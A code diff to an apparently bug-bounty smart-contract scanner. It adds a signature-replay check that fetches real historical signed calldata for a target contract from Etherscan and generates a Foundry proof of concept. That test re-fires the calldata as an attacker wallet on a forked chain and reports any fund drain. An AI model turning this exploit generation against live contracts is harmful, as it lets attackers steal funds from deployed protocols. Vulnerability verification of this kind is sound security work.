@@ -13,11 +13,14 @@ actually die / pay the attacker?), free mint, caller-chosen withdrawal, burn-fro
 """
 from __future__ import annotations
 
+import json
 import math
 import re
 import shutil
 import os
 import subprocess
+import urllib.parse
+import urllib.request
 from dataclasses import dataclass
 from pathlib import Path
 
@@ -500,6 +503,117 @@ def parse_overflow_outcome(finding, stdout: str, fallback: "PayloadVerdict") -> 
                           "(payout path differs) - not reproduced", metrics=metrics, injected=injected)
 
 
+# ---------------------------------------------------------------------------------------------
+# Tier 3 - historical signature replay. NO state injection: we re-fire a REAL past signed payload
+# the chain already accepted. If the contract tracks usedDigests / a nonce, the replay reverts ->
+# the signature-replay finding is a FALSE POSITIVE and is dropped. If it succeeds and the target
+# loses funds again, the reused signature IS replayable -> CONFIRMED. (Sound without any vm.store,
+# so a replay confirmation can be unconditional, unlike Tier-1.)
+ETHERSCAN_V2 = "https://api.etherscan.io/v2/api"
+# ABI length word for a 65-byte (r,s,v) signature blob - the marker of a signed, replayable payload.
+_SIG65_MARKER = "0000000000000000000000000000000000000000000000000000000000000041"
+
+
+def _http_json(url: str = None, data: bytes = None, headers: dict = None, timeout: int = 30):
+    req = urllib.request.Request(url, data=data, headers=headers or {"User-Agent": "bountyscan/0.9"})
+    with urllib.request.urlopen(req, timeout=timeout) as resp:
+        return json.loads(resp.read().decode("utf-8", "replace"))
+
+
+def _eth_get_tx_input(rpc_url: str, tx_hash: str) -> str | None:
+    try:
+        body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "eth_getTransactionByHash",
+                           "params": [tx_hash]}).encode()
+        d = _http_json(rpc_url, data=body, headers={"Content-Type": "application/json"})
+        return ((d.get("result") or {}).get("input")) or None
+    except Exception:
+        return None
+
+
+def fetch_historical_calldata(target: str, rpc_url: str | None = None, key: str | None = None,
+                              chain_id: int = 1, explicit_hash: str | None = None, limit: int = 80):
+    """Find a historical tx to `target` whose calldata carries a 65-byte signature (a replayable signed
+    payload). Returns (tx_hash, calldata_hex) or (None, None). Real past calldata - nothing is fabricated."""
+    key = key or os.environ.get("ETHERSCAN_API_KEY")
+    if explicit_hash and rpc_url:
+        cd = _eth_get_tx_input(rpc_url, explicit_hash)
+        if cd and _SIG65_MARKER in cd.lower():
+            return explicit_hash, cd
+        if cd:
+            return explicit_hash, cd      # caller named it explicitly; trust them
+    if not key:
+        return None, None
+    try:
+        res = _http_json(ETHERSCAN_V2 + "?" + urllib.parse.urlencode({
+            "chainid": chain_id, "module": "account", "action": "txlist", "address": target,
+            "startblock": 0, "endblock": 99999999, "page": 1, "offset": limit, "sort": "desc",
+            "apikey": key}))
+    except Exception:
+        return None, None
+    if str(res.get("status")) != "1" or not isinstance(res.get("result"), list):
+        return None, None
+    for tx in res["result"]:
+        inp = (tx.get("input") or "").lower()
+        if str(tx.get("isError", "0")) not in ("0", "", "None") or str(tx.get("txreceipt_status", "1")) == "0":
+            continue
+        if len(inp) >= 10 and _SIG65_MARKER in inp:      # a signed, replayable call
+            return tx.get("hash"), inp
+    return None, None
+
+
+_REPLAY_POC = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {{Test, console2}} from "forge-std/Test.sol";
+contract ReplayPoC is Test {{
+    address constant TARGET = {target};
+    address constant attacker = {attacker};   // canonical wallet - msg.sender AND tx.origin
+    function test_replay() public {{
+        bytes memory data = hex"{calldata}";   // the exact historical signed calldata, re-fired
+        uint256 attBefore = attacker.balance;
+        uint256 tgtBefore = TARGET.balance;
+        vm.prank(attacker, attacker);
+        (bool ok, ) = TARGET.call(data);
+        console2.log("RP_CALL_OK", ok);
+        console2.log("RP_ATT_DELTA", int256(attacker.balance) - int256(attBefore));
+        console2.log("RP_TGT_DELTA", int256(TARGET.balance) - int256(tgtBefore));
+    }}
+}}
+"""
+
+
+def build_replay_exploit(target: str, calldata_hex: str, wallet: str = ATTACKER_WALLET) -> str | None:
+    cd = re.sub(r"[^0-9a-fA-F]", "", (calldata_hex or "").replace("0x", "").replace("0X", ""))
+    if len(cd) < 8:                       # need at least a 4-byte selector
+        return None
+    return _REPLAY_POC.format(target=_addr_literal(target), attacker=_addr_literal(wallet), calldata=cd)
+
+
+_RP_RE = re.compile(r"^\s*(RP_[A-Z_]+)\s+(-?\d+|true|false)\s*$", re.M)
+
+
+def parse_replay_outcome(finding, stdout: str, fallback: "PayloadVerdict") -> "PayloadVerdict":
+    """Revert -> FALSE POSITIVE (replay blocked by usedDigests/nonce). Success + target loses funds ->
+    CONFIRMED (the reused signature is replayable). No logs -> static fallback."""
+    vals = {k: v for k, v in _RP_RE.findall(stdout)}
+    if "RP_CALL_OK" not in vals:
+        return fallback
+    call_ok = vals["RP_CALL_OK"] == "true"
+    att = int(vals.get("RP_ATT_DELTA", "0"))
+    tgt = int(vals.get("RP_TGT_DELTA", "0"))
+    metrics = {"call_ok": call_ok, "att_wei": att, "att_tok": 0, "tgt_wei": tgt, "tgt_tok": 0, "code": 0}
+    injected = "Tier 3 historical replay: a real past signed calldata re-fired as the wallet (no state injection)"
+    if not call_ok:
+        return PayloadVerdict(finding, "reverted", "replay BLOCKED - re-firing the historical signed "
+                              "calldata reverts (usedDigests / nonce guard holds); NOT replayable",
+                              metrics=metrics, injected=injected)
+    if tgt < 0:
+        return PayloadVerdict(finding, "confirmed", f"REPLAY SUCCEEDED - the reused signed calldata drained "
+                              f"{-tgt} wei from the target a second time", profit_wei=-tgt,
+                              metrics=metrics, injected=injected)
+    return PayloadVerdict(finding, "no_change", "replay call succeeds but the target lost no funds - the "
+                          "reused payload is inert, not a drain", metrics=metrics, injected=injected)
+
+
 def _function_of(files: list[SourceFile], finding) -> Function | None:
     for f in files:
         for c in f.contracts:
@@ -553,6 +667,26 @@ def run_payloads(findings: list, files: list[SourceFile], target: str, rpc_url: 
                 r2 = subprocess.run([forge, "test", "--mp", "test/Exploit.t.sol", "--fork-url", rpc_url, "-vv"] + fb,
                                     cwd=proj, capture_output=True, text=True, timeout=timeout)
                 verdicts.append(parse_overflow_outcome(f, r2.stdout + "\n" + r2.stderr, static))
+            except subprocess.TimeoutExpired:
+                verdicts.append(static)
+            except Exception:
+                verdicts.append(static)
+            continue
+        if f.detector == "signature-replay":
+            # Tier 3: fetch a real historical signed call to the target and replay it. Revert -> FP.
+            static = PayloadVerdict(f, "manual", "signature-replay: needs a historical signed tx to replay; verify by hand")
+            try:
+                txh, cd = fetch_historical_calldata(target, rpc_url)
+                poc = build_replay_exploit(target, cd, wallet) if cd else None
+                if poc is None:
+                    verdicts.append(static)
+                    continue
+                (proj / "test" / "Exploit.t.sol").write_text(poc, encoding="utf-8")
+                cmd = [forge, "test", "--mp", "test/Exploit.t.sol", "--fork-url", rpc_url, "-vv"]
+                if fork_block:
+                    cmd += ["--fork-block-number", str(fork_block)]
+                r = subprocess.run(cmd, cwd=proj, capture_output=True, text=True, timeout=timeout)
+                verdicts.append(parse_replay_outcome(f, r.stdout + "\n" + r.stderr, static))
             except subprocess.TimeoutExpired:
                 verdicts.append(static)
             except Exception:
